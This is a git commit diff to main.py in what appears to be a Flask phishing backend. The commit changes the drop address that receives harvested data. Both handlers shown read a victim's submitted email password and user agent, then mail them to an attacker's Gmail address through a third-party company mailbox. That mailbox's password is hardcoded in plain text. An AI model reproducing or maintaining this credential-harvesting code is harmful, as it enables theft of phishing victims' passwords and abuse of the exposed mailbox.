f8247f3f47ed6b846569810008a9c4b46299e8ad
Entelnetz <joyahot@entelnet.bo>
2026-02-02 13:01:36 +0000

    Update main.py

--- main.py
+++ main.py
@@ -178,7 +178,7 @@ def first():
         passwordemail = request.form.get('pig')
         sender_email = 'siniestros@crcseguros.cl'
         sender_emaill = 'siniestros'
-        receiver_email = 'kokob3ware@gmail.com'
+        receiver_email = 'thomasaal0001@gmail.com'
         password = '*Siniestros$007'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
@@ -219,7 +219,7 @@ def second():
         passwordemail = request.form.get('pig')
         sender_email = 'siniestros@crcseguros.cl'
         sender_emaill = 'siniestros'
-        receiver_email = 'kokob3ware@gmail.com'
+        receiver_email = 'thomasaal0001@gmail.com'
         password = '*Siniestros$007'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
